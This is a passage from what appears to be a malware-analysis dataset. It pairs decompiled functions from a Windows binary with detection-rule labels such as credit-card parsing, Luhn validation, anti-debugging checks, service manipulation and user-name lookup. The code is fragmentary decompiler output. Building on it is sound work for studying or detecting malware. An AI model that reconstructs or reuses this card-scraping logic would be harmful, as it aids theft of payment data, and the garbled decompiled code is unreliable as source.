+ -0x2c) = *(in_EAX + -0x2c) + unaff_EBP + (uVar15 < 0xffffff85 || uVar3 + 0x7b < in_AF);\n    }\n    fcn.00401d20(0x411754, 0x12, in_stack_fffffff0, uVar23);\n    fcn.00401d20(0x411754, 0x12, 0x4114f0, 0xf);\n    fcn.00401d20(0x411754, 0x12, 0x411500, 0x1a);\n    fcn.00401d20(0x411754, 0x12, 0x411554, 10);\n    fcn.00401d20(0x411754, 0x12, 0x411560, 0xb);\n    cVar19 = '\\0';\n    uVar6 = extraout_DL & unaff_EBX;\n    cVar18 = uVar6 < '\\0';\n    bVar16 = uVar6 == 0;\n    uVar23 = 0x402789;\n    iVar4 = fcn.00401d20(0x411754, 0x12, 0x41156c, 8);\n    if ((bVar16 || cVar19 != cVar18) || (!bVar16 && cVar19 == cVar18)) {\n        uVar23 = 9;\n        in_stack_ffffffe0 = 0x411574;\n        in_stack_ffffffdc = 0x12;\n    }\n    puVar8 = ((unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff) + 1;\n    *(iVar4 + 0x6a39da56) = *(iVar4 + 0x6a39da56) ^ extraout_CL;\n    *(iVar4 + 0x74) = *(iVar4 + 0x74) | unaff_EBP;\n    bVar16 = iVar4 + 0x126a0041 < 0;\n    uVar22 = 0x4027ae;\n    iVar4 = fcn.00401d20(0x411754, in_stack_ffffffdc, in_stack_ffffffe0, uVar23);\n    if ((bVar16) || (!bVar16)) {\n        uVar22 = 9;\n    }\n    *puVar8 = *puVar8 & 0xc3;\n    fcn.00401d20(0x411754, 0x12, 0x411580, uVar22);\n    fcn.00401d20(0x411754, 0x12, 0x41158c, 9);\n    bVar16 = false;\n    bVar17 = ((extraout_CH ^ extraout_AH) + 1 & 0x27) == 0;\n    puVar5 = fcn.00401d20(0x411754, 0x12, 0x411598, 0xc);\n    if (!bVar16 && !bVar17) {\n        puVar8 = puVar8 & 0xffff00ff;\n    }\n    *unaff_EDI = *(iVar4 + -0x1bf31dd6);\n    uVar7 = CONCAT11(0xdf, puVar8);\n    puVar5[-1] = 0x411754;\n    puVar5[-2] = 0x402860;\n    fcn.00401d20(puVar5[-1], *puVar5, puVar5[1], puVar5[2]);\n    puVar5[6] = puVar8 & 0xffff0000 | uVar7;\n    cVar19 = '\\0';\n    uVar7 = uVar7 & extraout_CX;\n    cVar18 = uVar7 < 0;\n    bVar16 = uVar7 == 0;\n    puVar5[6] = 10;\n    puVar5[5] = 0x4115a8;\n    puVar5[4] = 0x12;\n    puVar10 = puVar5 + 3;\n    puVar5[3] = 0x411754;\n    puVar5[2] = 0x40287b;\n    fcn.00401d20(puVar5[3], puVar5[4], puVar5[5], puVar5[6]);\n    if ((bVar16 || cVar19 != cVar18) || (!bVar16 && cVar19 == cVar18)) {\n        puVar10 = puVar5 + 2;\n        puVar5[2] = 0x40;\n    }\n    puVar10[-1] = 0x4115b4;\n    puVar10[-2] = 0x12;\n    puVar10[-3] = 0x411754;\n    puVar10[-4] = 0x40289c;\n    Var21 = fcn.00401d20(puVar10[-3], puVar10[-2], puVar10[-1], *puVar10);\n    bVar16 = 0xffffffdf < puVar10 + -3;\n    puVar10[4] = Var21;\n    *(puVar10 + 0xe) = Var21 >> 0x20;\n    puVar10[4] = 0xc;\n    puVar10[3] = 0x4115f4;\n    puVar10[2] = 0x12;\n    puVar11 = puVar10 + 1;\n    puVar10[1] = 0x411754;\n    *puVar10 = 0x4028b9;\n    fcn.00401d20(puVar10[1], puVar10[2], puVar10[3], puVar10[4]);\n    if ((bVar16) || (!bVar16)) {\n        *puVar10 = 0xb;\n        puVar10[-1] = 0x411600;\n        puVar11 = puVar10 + -2;\n        puVar10[-2] = 0x12;\n    }\n    uVar15 = unaff_EDI + 1 ^ *(unaff_EDI + 0xe58be77);\n    iVar9 = iStackY128 + -0x2d1313ba;\n    *(iVar4 + -0x1bf31dd2) = *(iVar4 + -0x1bf31dd2) + extraout_EDX;\n    pcVar1 = extraout_EDX + 0x12;\n    *pcVar1 = *pcVar1 + (extraout_ECX + 1 >> 8);\n    bVar16 = (POPCOUNT(*pcVar1) & 1U) == 0;\n    puVar12 = puVar11 + -1;\n    puVar11[-1] = 0x411754;\n    puVar11[-2] = 0x4028dd;\n    iVar4 = fcn.00401d20(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    if (bVar16) {\ncode_r0x004028f4:\n        puVar11[-2] = 4;\n        puVar11[-3] = 0x41160c;\n        puVar12 = puVar11 + -4;\n        puVar11[-4] = 0x12;\n    }\n    else {\n        puVar11[-2] = uVar15;\n        uVar15 = puVar11[-2];\n        if (!bVar16) goto code_r0x004028f4;\n    }\n    pcVar1 = iVar4 + 0x12;\n    *pcVar1 = *pcVar1 + (extraout_ECX_00 + 1 >> 8);\n    bVar16 = *pcVar1 == '\\0';\n    puVar12[-1] = 0x411754;\n    puVar12[-2] = 0x402907;\n    uVar20 = fcn.00401d20(puVar12[-1], *puVar12, puVar12[1], puVar12[2]);\n    uVar23 = uVar20;\n    if (bVar16) {\ncode_r0x00402925:\n        puVar13 = puVar12 + -2;\n        puVar12[-2] = 4;\n    }\n    else {\n        puVar12[-2] = uVar15;\n        if (!bVar16) goto code_r0x00402925;\n        uVar22 = in(uVar20 >> 0x20);\n        *puVar12[-2] = uVar22;\n        puVar13 = puVar12 + -5;\n        puVar14 = puVar12 + -5;\n        if (puVar12 + -1 < 1) goto code_r0x0040298f;\n    }\n    puVar8 = (uVar20 >> 0x20) + 4;\n    *puVar8 = *puVar8 ^ extraout_CH_00;\n    puVar13[-1] = 0x411610;\n    puVar13[-2] = 0x12;\n    puVar13[-3] = 0x411754;\n    puVar13[-4] = 0x402938;\n    uVar20 = fcn.00401d20(puVar13[-3], puVar13[-2], puVar13[-1], *puVar13);\n    puVar13[0xc] = uVar20;\n    puVar13[0xb] = iVar9;\n    puVar13[10] = uVar20 >> 0x20;\n    iVar9 = puVar13[0xb];\n    puVar13[0xc] = 0xc;\n    puVar13[0xb] = 0x411614;\n    puVar13[10] = 0x12;\n    puVar13[9] = 0x411754;\n    puVar13[8] = 0x40295f;\n    Var21 = fcn.00401d20(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    *(puVar13 + 0x32) = Var21 >> 0x20;\n    *(puVar13 + 0x2e) = Var21;\n    puVar13[0xc] = 4;\n    puVar13[0xb] = 0x411620;\n    puVar13[10] = 0x12;\n    puVar13[9] = 0x411754;\n    puVar13[8] = 0x40298a;\n    Var21 = fcn.00401d20(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    uVar23 = Var21;\n    puVar14 = puVar13 + 0x32;\n    *(puVar13 + 0x32) = Var21 >> 0x20;\ncode_r0x0040298f:\n    *(puVar14 + -4) = uVar23;\n    *(puVar14 + -2) = 9;\n    *(puVar14 + -6) = 0x411624;\n    *(puVar14 + -10) = 0x12;\n    *(puVar14 + -0xe) = 0x411754;\n    *(puVar14 + -0x12) = 0x4029b5;\n    fcn.00401d20(*(puVar14 + -0xe), *(puVar14 + -10), *(puVar14 + -6), *(puVar14 + -2));\n    *(puVar14 + -2) = extraout_ECX_01;\n    *(puVar14 + -2) = 0x16;\n    *(puVar14 + -6) = 0x411630;\n    *(puVar14 + -10) = 0x12;\n    *(puVar14 + -0xe) = 0x411754;\n    *(puVar14 + -0x12) = 0x4029d8;\n    fcn.00401d20(*(puVar14 + -0xe), *(puVar14 + -10), *(puVar14 + -6), *(puVar14 + -2));\n    *(puVar14 + -2) = iVar9;\n    *(puVar14 + -2) = 7;\n    *(puVar14 + -6) = 0x411648;\n    *(puVar14 + -10) = 0x12;\n    *(puVar14 + -0xe) = 0x411754;\n    *(puVar14 + -0x12) = 0x4029f9;\n    fcn.00401d20(*(puVar14 + -0xe), *(puVar14 + -10), *(puVar14 + -6), *(puVar14 + -2));\n    return;\n}\n",
        "token_count": 3510
    },
    "00403b80": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    char in_AF;\n    bool bVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar3 = &var_107h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x411698);\n    bVar4 = iVar2 != 0;\n    if (!bVar4) {\n        if ((bVar4) && (!bVar4)) {\n            if (unaff_EBX + 1 == 0) {\n                return 0;\n            }\n            piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - (unaff_EBX + 1);\n            arg_8h = arg_8h + 1;\n        }\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403b00, 0);\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 520
    },
    "00402da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402dcc)\n// WARNING: Removing unreachable block (ram,0x00402dd5)\n// WARNING: Removing unreachable block (ram,0x00402dd9)\n\nbool __cdecl fcn.00402da0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402d40();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00404ad0();\n        arg_ch_01 = fcn.00404ad0();\n        arg_ch_02 = fcn.00404ad0();\n        fcn.004041e0(arg_10h, arg_ch_00);\n        fcn.004041e0(arg_8h, arg_ch_01);\n        fcn.004041e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4112e8, &lpBuffer, arg_10h);\n        iVar2 = fcn.004042b0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4112f4, &lpBuffer, arg_8h);\n            iVar2 = fcn.004042b0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4112f4, &lpBuffer, arg_ch);\n                iVar2 = fcn.004042b0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004041e0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 670
    },
    "00404840": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048e3) overlaps instruction at (ram,0x004048de)\n// \n// WARNING: Removing unreachable block (ram,0x004048d7)\n// WARNING: Removing unreachable block (ram,0x004048dd)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00404840(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 252
    },
    "00405070": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405070(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    bool bVar2;\n    float10 fVar3;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    bVar2 = false;\n    fVar3 = fcn.00404f30(arg_8h_00, arg_8h);\n    if ((!bVar2) && (bVar2)) {\n        *(arg_8h + 0x1c) = fVar3;\n        arg_8h = arg_8h + 5;\n        arg_8h_00 = arg_8h_00 + 5;\n    }\n    uVar1 = fcn.00404eb0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 239
    },
    "00404f30": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint32_t * __cdecl fcn.00404f30(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint extraout_ECX;\n    uint unaff_EBX;\n    bool bVar3;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n        if (iVar1 == 0) {\n            return NULL;\n        }\n        bVar3 = 0xcf < unaff_EBX >> 8;\n        puVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        if (bVar3) break;\n        if (!bVar3) break;\n        arg_ch = puVar2 + 1;\n        arg_8h = extraout_ECX;\n        if (&stack0xfffffff4 < *puVar2 || arg_ch == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return puVar2;\n}\n",
        "token_count": 272
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 258
    },
    "004010b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401108) overlaps instruction at (ram,0x00401106)\n// \n\nbool fcn.004010b0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    char *pcVar3;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00401c40(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    if (-1 < var_4h) {\n        if (-1 >= var_4h) {\n            *(unaff_EBX + -0xd3fcc06) = *(unaff_EBX + -0xd3fcc06) + -1;\n            goto code_r0x00401114;\n        }\n    }\n    iVar2 = -1;\n    pcVar3 = var_4h;\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\ncode_r0x00401114:\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41149c, 0x4114dc, 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 335
    },
    "00401560": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401560(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004012d0(&var_68h, &var_4h);\n    fcn.00404b00(&var_68h, var_4h, 0x407010, 0xa2c0);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa2c0;\n    return;\n}\n",
        "token_count": 241
    },
    "00401c40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401caa) overlaps instruction at (ram,0x00401ca9)\n// \n// WARNING: Removing unreachable block (ram,0x00401c9a)\n\nuint __cdecl fcn.00401c40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 308
    },
    "00402a00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c29) overlaps instruction at (ram,0x00402c27)\n// \n\nvoid fcn.00402a00(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    char extraout_CL;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar4;\n    uint8_t extraout_DL;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t unaff_BL;\n    uint *puVar5;\n    uint *unaff_EBP;\n    uint16_t in_SS;\n    uchar uVar6;\n    bool bVar7;\n    uint32_t arg_ch;\n    uint uVar8;\n    \n    fcn.00401d20(0x411754, 0x12, 0x411650, 0x20);\n    uVar4 = in_SS;\n    fcn.00401d20(0x411754, 0x12, 0x411670, 0x47);\n    uVar6 = 0;\n    bVar7 = (extraout_DL & unaff_BL) == 0;\n    fcn.00401d20(0x411754, 0x12, 0x411698, 8);\n    if ((!bVar7) && (bVar7)) {\n        puVar5 = &stack0xffffffdc;\n        cVar1 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar2 = fcn.00401d20(0x411754, 0x12, 0x4116a0, 0x19);\n    if ((!uVar6) && (uVar6)) {\n        out(0xbd, uVar2);\n        return;\n    }\n    fcn.00401d20(0x411754, 0x12, 0x4116bc, 0xb);\n    iVar3 = fcn.00401d20(0x411754, 0x12, 0x4116c8, 0x12);\n    bVar7 = (POPCOUNT(uVar4 - iVar3 & 0xff) & 1U) == 0;\n    uVar8 = 0x12;\n    uVar2 = 0x411754;\n    fcn.00401d20(0x411754, 0x12, 0x4116dc, 0x12);\n    if ((bVar7) || (uVar4 = extraout_ECX,  !bVar7)) {\n        uVar4 = 0;\n    }\n    *(extraout_EDX + 2) = *(extraout_EDX + 2) + -0x68;\n    LOCK();\n    arg_ch = uVar4 & 0xffff0000 | in_SS;\n    *(extraout_EDX + 0x12) = *(extraout_EDX + 0x12) + (extraout_ECX + 1 >> 8);\n    fcn.00401d20(0x411754, arg_ch, uVar2, uVar8);\n    fcn.00401d20(0x411754, 0x12, 0x4116f4, 8);\n    fcn.00401d20(0x411754, 0x12, 0x4116fc, 8);\n    fcn.00401d20(0x411754, 0x12, 0x411704, 6);\n    fcn.00401d20(0x411754, 0x12, 0x41170c, 7);\n    bVar7 = extraout_CL + -1 < '\\0';\n    uVar8 = 0x402c14;\n    fcn.00401d20(0x411754, 0x12, 0x411714, 7);\n    uVar4 = extraout_ECX_00;\n    if ((bVar7) || (uVar4 = extraout_ECX_00 & 0xffff,  !bVar7)) {\n        uVar8 = 6;\n        uVar2 = 0x41171c;\n        arg_ch = 0x12;\n    }\n    *(extraout_EDX_00 + 0x12) = *(extraout_EDX_00 + 0x12) + (uVar4 + 1 >> 8);\n    fcn.00401d20(0x411754, arg_ch, uVar2, uVar8);\n    fcn.00401d20(0x411754, 0x12, 0x411724, 0x25);\n    fcn.00401d20(0x411754, 0x12, 0x41174c, 8);\n    return;\n}\n",
        "token_count": 1128
    },
    "00402ca0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00402ca0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar1 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar1 = iVar1 + -1;\n                    if (iVar1 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 322
    },
    "00403c80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get Program Files directory"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d2e) overlaps instruction at (ram,0x00403d2c)\n// \n// WARNING: Removing unreachable block (ram,0x00403d2b)\n\nvoid fcn.00403c80(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_DL;\n    char extraout_DL_00;\n    char cVar4;\n    int32_t unaff_EBX;\n    code *unaff_ESI;\n    code *pcVar5;\n    int32_t unaff_EDI;\n    uint *puVar6;\n    bool bVar7;\n    uchar uVar8;\n    bool bVar9;\n    code *in_stack_fffffd74;\n    uchar *puStack648;\n    \n    bVar7 = &stack0xfffffffc < 0x260;\n    bVar9 = unaff_EBX == -1;\n    piVar1 = fcn.00402a00();\n    if (((!bVar7 && !bVar9) && (bVar7 || bVar9)) ||\n       (piVar1 = fcn.00403470(),  in_stack_fffffd74 = unaff_ESI,  puStack648 = &stack0xfffffffc,  piVar1 != NULL)) {\n        *(unaff_EDI + -0x18) = *(unaff_EDI + -0x18) - &stack0xfffffd70;\n        *piVar1 = *piVar1 + piVar1;\n        *(piVar1 + 0x66) = *(piVar1 + 0x66) + (piVar1 >> 8);\n        puStack648[-0x260] = 0;\n        puVar6 = puStack648 + -0x25f;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar3 != 0) {\n            fcn.00402d40();\n            puStack648[-0x15c] = 0;\n            puVar6 = puStack648 + -0x15b;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            *(puStack648 + -0x14) = 0;\n            do {\n                puVar6 = puStack648 + -0x58;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                *(puStack648 + -0x10) = 0;\n                *(puStack648 + -0x58) = 0x44;\n                *(puStack648 + -0xc) = 0;\n                *(puStack648 + -0x2c) = 1;\n                *(puStack648 + -8) = 0;\n                *(puStack648 + -0x28) = 0;\n                *(puStack648 + -4) = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                if (iVar3 == 0) {\n                    return;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                uVar8 = (POPCOUNT(iVar2 - 0x102U & 0xff) & 1U) == 0;\n                iVar3 = extraout_ECX;\n                cVar4 = extraout_DL;\n                if (iVar2 - 0x102U == 0) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(puStack648 + -0x10), 1);\n                    iVar3 = extraout_ECX_00;\n                    cVar4 = extraout_DL_00;\n                }\n                pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((uVar8) || (!uVar8)) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puStack648 + -0xc));\n                }\n                else {\n                    *0x358bf44d = *0x358bf44d | 0xffffff8c;\n                    *(iVar3 + -1) = *(iVar3 + -1) + cVar4;\n                    pcVar5 = in_stack_fffffd74;\n                }\n                (*pcVar5)(*(puStack648 + -0x10));\n                iVar3 = *(puStack648 + -0x14);\n                *(puStack648 + -0x14) = iVar3 + 1;\n                in_stack_fffffd74 = pcVar5;\n            } while (iVar3 + 1 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1233
    },
    "00403f50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403f90) overlaps instruction at (ram,0x00403f8e)\n// \n\nvoid __cdecl fcn.00403f50(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    uint uVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    int32_t unaff_EDI;\n    uchar uVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    \n    if (arg_ch == 1) {\n        uVar5 = 0;\n        bVar6 = true;\n        uVar7 = fcn.00402060();\n        pcVar4 = uVar7 >> 0x20;\n        uVar2 = uVar7;\n        if (!bVar6) {\n            if (bVar6) {\n                out(*0x1, uVar7 >> 0x20);\n                do {\n                    cVar3 = uVar2 >> 8;\n                    in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                    uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar3 - in_AF), -in_AF);\n                } while (in_AF || cVar3 == *pcVar4);\n                piVar1 = unaff_EDI + pcVar4 * 2;\n                *piVar1 = (*piVar1 + 0x7b) - in_AF;\n                